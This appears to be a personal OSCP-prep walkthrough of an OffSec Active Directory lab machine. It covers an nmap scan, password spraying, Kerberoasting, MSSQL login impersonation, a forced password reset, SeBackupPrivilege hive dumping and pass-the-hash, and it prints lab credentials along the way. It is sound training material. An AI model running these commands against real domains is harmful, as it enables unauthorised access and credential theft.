@@ -1,0 +1,399 @@
+**Start 15:48 16-05-2025**
+
+---
+```
+Scope:
+192.168.128.40
+```
+# Recon
+
+## Nmap
+
+```bash
+sudo nmap -sC -sV hokkaido -sT -vvvv -p- -Pn -T5 --min-rate=5000
+
+PORT      STATE    SERVICE        REASON      VERSION
+53/tcp    open     domain         syn-ack     Simple DNS Plus
+80/tcp    open     http           syn-ack     Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+88/tcp    open     kerberos-sec   syn-ack     Microsoft Windows Kerberos (server time: 2025-05-16 14:02:02Z)
+135/tcp   open     msrpc          syn-ack     Microsoft Windows RPC
+139/tcp   open     netbios-ssn    syn-ack     Microsoft Windows netbios-ssn
+389/tcp   open     ldap           syn-ack     Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-05-16T14:02:58+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
+| Issuer: commonName=hokkaido-aerospace-DC-CA/domainComponent=hokkaido-aerospace
+445/tcp   open     microsoft-ds?  syn-ack
+464/tcp   open     kpasswd5?      syn-ack
+593/tcp   open     ncacn_http     syn-ack     Microsoft Windows RPC over HTTP 1.0
+636/tcp   open     ssl/ldap       syn-ack     Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
+| Issuer: commonName=hokkaido-aerospace-DC-CA/domainComponent=hokkaido-aerospace
+1433/tcp  open     ms-sql-s       syn-ack     Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   192.168.128.40:1433: 
+|     Target_Name: HAERO
+|     NetBIOS_Domain_Name: HAERO
+|     NetBIOS_Computer_Name: DC
+|     DNS_Domain_Name: hokkaido-aerospace.com
+|     DNS_Computer_Name: dc.hokkaido-aerospace.com
+|     DNS_Tree_Name: hokkaido-aerospace.com
+|_    Product_Version: 10.0.20348
+|_ssl-date: 2025-05-16T14:02:58+00:00; 0s from scanner time.
+| ms-sql-info: 
+|   192.168.128.40:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+3268/tcp  open     ldap           syn-ack     Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
+| Issuer: commonName=hokkaido-aerospace-DC-CA/domainComponent=hokkaido-aerospace
+|_ssl-date: 2025-05-16T14:02:58+00:00; 0s from scanner time.
+3269/tcp  open     ssl/ldap       syn-ack     Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-05-16T14:02:58+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
+| Issuer: commonName=hokkaido-aerospace-DC-CA/domainComponent=hokkaido-aerospace
+3389/tcp  open     ms-wbt-server  syn-ack     Microsoft Terminal Services
+| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
+| Issuer: commonName=dc.hokkaido-aerospace.com
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-05-15T13:51:51
+| Not valid after:  2025-11-14T13:51:51
+| MD5:   37b4:2769:019c:9068:c300:46e5:9ca9:3e0e
+| SHA-1: 25cf:2462:c0b0:737c:55cf:04b2:695c:9b14:96ee:d53d
+| rdp-ntlm-info: 
+|   Target_Name: HAERO
+|   NetBIOS_Domain_Name: HAERO
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: hokkaido-aerospace.com
+|   DNS_Computer_Name: dc.hokkaido-aerospace.com
+|   DNS_Tree_Name: hokkaido-aerospace.com
+|   Product_Version: 10.0.20348
+|_  System_Time: 2025-05-16T14:02:51+00:00
+|_ssl-date: 2025-05-16T14:02:58+00:00; 0s from scanner time.
+5985/tcp  open     http           syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+8530/tcp  open     http           syn-ack     Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-title: 403 - Forbidden: Access is denied.
+8531/tcp  open     unknown        syn-ack
+9389/tcp  open     mc-nmf         syn-ack     .NET Message Framing
+47001/tcp open     http           syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49684/tcp open     ncacn_http     syn-ack     Microsoft Windows RPC over HTTP 1.0
+58538/tcp open     ms-sql-s       syn-ack     Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   192.168.128.40:58538: 
+|     Target_Name: HAERO
+|     NetBIOS_Domain_Name: HAERO
+|     NetBIOS_Computer_Name: DC
+|     DNS_Domain_Name: hokkaido-aerospace.com
+|     DNS_Computer_Name: dc.hokkaido-aerospace.com
+|     DNS_Tree_Name: hokkaido-aerospace.com
+|_    Product_Version: 10.0.20348
+| ms-sql-info: 
+|   192.168.128.40:58538: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 58538
+```
+
+I checked out the open web ports, nothing.
+SMB port was not accessible without creds.
+
+## Brute Force
+
+I start off brute forcing usernames, then we will create a wordlist of possible passwords to try and spray.
+
+![](../../../assets/a8bffd864fabc6508c25ca87a5466428.png)
+
+After getting some valid users I first try out `user - user` since that typically works in all these OffSec boxes.
+
+### Password Spraying
+
+![](../../../assets/199ae52228eafe68053712533cef5cae.png)
+
+This one seemed to work
+
+```
+info 
+info
+```
+
+We get a boatload of open shares that we can access.
+
+Let's check out the `/homes` share:
+
+![](../../../assets/ff101fc95966e341333bddb7d00d7fa8.png)
+
+Hell yeah yet again a boatload of usernames.
+
+>[!note]
+>Since in [[Nagoya]] I had to think outside of the box on thinking up the password spray, I tried the same here:
+>![](../../../assets/0527598afd9a01a478cfab10a0d36189.png)
+
+![](../../../assets/22e99844cbdede5cb6c539d2c7073d5f.png)
+
+No luck here.
+
+Let's see what we can find on SMB.
+
+![](../../../assets/c611d1f1c5d1ca3ef42f7e55ee54d3f1.png)
+
+![](../../../assets/d47bfb129c307616b8a1f8fb4d294934.png)
+
+All these directories are empty? Time to check out another share.
+
+![](../../../assets/68e3348c1de8ae8e13fcce42bde81857.png)
+
+Well that looks promising??
+
+### Password Reset
+
+![](../../../assets/48272e818ed34cec37e1f959ef28381a.png)
+
+I went ahead and sprayed the creds and it seems like one account actually still had the default password:
+
+![](../../../assets/1b0f579a033e049104af461327abe823.png)
+
+```
+discovery
+Start123!
+```
+
+Since neither found accounts were actually able to login anywhere it was time for **Kerberoasting**.
+
+## Kerberoasting
+
+![](../../../assets/e8798c1a4f2c3eeb4c2a01fb4e2480b4.png)
+
+Hell yeah.
+
+I then tried `john` to crack the hashes:
+
+![](../../../assets/b67cb1c4747fffc58e75923299579142.png)
+
+Too bad.
+
+## MSSQL
+
+I tried again to log in as *discovery* into `mssql` slightly modifying my command this time:
+
+```bash
+impacket-mssqlclient 'hokkaido-aerospace.com/discovery':'Start123!'@hokkaido -dc-ip hokkaido -windows-auth
+```
+
+![](../../../assets/0d1ac88c2451b8640bd0dcb6f0e311ed.png)
+
+>[!important]
+>Beforehand I tried to log in but omitted the `-windows-auth` which failed me to log in:
+>![](../../../assets/77d865807a36b80fadc3a30de0d90b20.png)
+
+I tried to enable `xp_cmdshell` but unfortunately I couldn't:
+
+![](../../../assets/7fb3e0e6298800b74bbc0d50997e7945.png)
+
+Let's see what else we can do.
+
+### Enumerating Databases
+
+![](../../../assets/2ae79f99a036de23900b3c9b15e7128d.png)
+
+`hrappdb`? Sounds interesting, let's check it out.
+
+![](../../../assets/201652d1b7c42f9c4b08871526e6b407.png)
+
+We'll have to impersonate another user, let's check out whom we can impersonate:
+
+![](../../../assets/027c725157ba9889bf921a96bbea126f.png)
+
+```sql
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+```
+
+![](../../../assets/8c8624ee46c21162b0706d8a44c86d8d.png)
+
+```sql
+EXECUTE AS LOGIN = 'hrappdb-reader'
+use hrappdb
+```
+
+![](../../../assets/e8751bd387b21ebfa80952b5f3a276c6.png)
+
+Nice, now we can check it out.
+
+![](../../../assets/32315267fb0e32412e41f78be206d3f4.png)
+
+There's just one table called `sysauth`.
+
+![](../../../assets/be9741ae242589c3bc4f462508a820e3.png)
+
+```
+hrapp-service
+Untimed$Runny
+```
+
+That's weird because I haven't seen this user in here before:
+
+![](../../../assets/62c64b559e0b461983dc3d55918060f9.png)
+
+Despite the above I logged in but still had no rights for `enable_xp_cmdshell`:
+
+![](../../../assets/bbe95b1cc21c3235767ae7ad36113915.png)
+
+Could be for the other `mssql` instance, since `nmap` displayed another instance on `53538`?
+
+![](../../../assets/b4e82da5c5b0ba195b533d35b1e6e0d8.png)
+
+Right this shit didn't work.
+
+## BloodHound
+
+I got stuck fucking around with `mssql` and decided to try out uploading bloodhound with the newly found creds.
+
+>[!note]
+>Password spraying didn't get me shit:
+>![](../../../assets/9e7de7264d4920d1df91d2d55dd5191d.png)
+
+![](../../../assets/c9eefc7c8f3858555f6b811a5601cbe3.png)
+
+I went on and setup `docker-compose` as always and started up `BloodHound`.
+
+![](../../../assets/12fd77521b8bc4ae94c192871c3fe79d.png)
+
+It seems we can use a targeted kerberoast against *Hazel.Green* 
+
+![](../../../assets/ed1c47d80deaf4022d4276fa63cde4f3.png)
+
+Let's do it!
+
+### Targeted Kerberoast
+
+```bash
+python3 targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --request-user 'Hazel.Green' --dc-ip hokkaido > hazel.hash
+```
+
+![](../../../assets/2d9921b34072e8d3c60ec7e238a2b0dd.png)
+
+We can now go ahead and use `john` to crack it:
+
+![](../../../assets/ec1c54039adee294027687fe485cd187.png)
+
+Awesome!
+
+```
+Hazel.Green
+haze1988
+```
+
+I went on to enumerate further since the groups that *Hazel* was in were quite interesting:
+
+![](../../../assets/ea5150b0e57f3f75a360eed8d2fe29c8.png)
+
+I checked out *Molly*:
+
+![](../../../assets/c7a7ebe21e11260fa861f0956bdd5469.png)
+
+Turns out *Molly* is in fact a **Tier1-Admin**.
+
+## Force Change Password
+
+>[!note]
+>Yet again we can use our knowledge from [[Nagoya#Set Up]] in order to force a password change for *Molly* using the `net rpc` command.
+
+```bash
+net rpc password "molly.smith" "Pass@123" -U 'hokkaido-aerospace.com'/'hazel.green'%'haze1988' -S "192.168.128.40"
+```
+
+![](../../../assets/84e4f5db7097168ea8cf566f5a8aa93c.png)
+
+Weird?
+
+Let's try another trick up our sleeve.
+
+```bash
+rpcclient -N 192.168.128.40 -U 'hazel.green%haze1988'
+```
+
+![](../../../assets/f9269d0e9c26802aa57ad0cfd4f286f6.png)
+
+What???
+
+>[!bug]
+>Turns out I had to reset the machine again....
+
+![](../../../assets/f65a5f1ae02c5f9f59906205e678f066.png)
+
+>[!success]
+>Now it worked, no error = good.
+
+# Foothold
+## RDP as Molly
+
+![](../../../assets/b5ae9ab7aa3e79bc4861bdbbff6553c9.png)
+
+We successfully RDP into the target as *Molly*.
+
+### local.txt
+
+![](../../../assets/b8fe6c716769082378dc41fe2eaad574.png)
+
+# Privilege Escalation
+## SeBackupPrivilege
+
+Since we're part of the **Tier1-Admin** group as *Molly* we can try to open up `cmd` or `powershell` as admin:
+
+![](../../../assets/86431df484a8a8e243c57b94ef51e33b.png)
+
+![](../../../assets/5095f3edfbb170f54b3d1dc932ae414b.png)
+
+We have the `SeBackupPrivilege`, I check my [[00 Windows PrivEsc.canvas|00 Windows PrivEsc]] guide:
+
+![](../../../assets/fdf470358f78711f34be90fc8237a374.png)
+
+We can get SAM + SYSTEM by copying them over.
+
+![](../../../assets/c0a190cc5e2124537c57e3f7469830cc.png)
+
+![](../../../assets/b4c4dffa35acc53c664d427bc6c115a9.png)
+
+And just like that we get the NTLM hash for *Administrator*.
+
+## Pass The Hash
+
+Now we can go ahead and use `evil-winrm` to login as *Administrator* by passing the hash.
+
+### proof.txt
+
+![](../../../assets/e71af9c437fb461881f580ed3292051e.png)
+
+---
+
+**Finished 22:07 16-05-2025**
+
+[^Links]: [[OSCP Prep]]
+
+#pass-the-hash #MSSQL #BloodHound #enumeration #SeBackupPrivilege #kerberoasting 
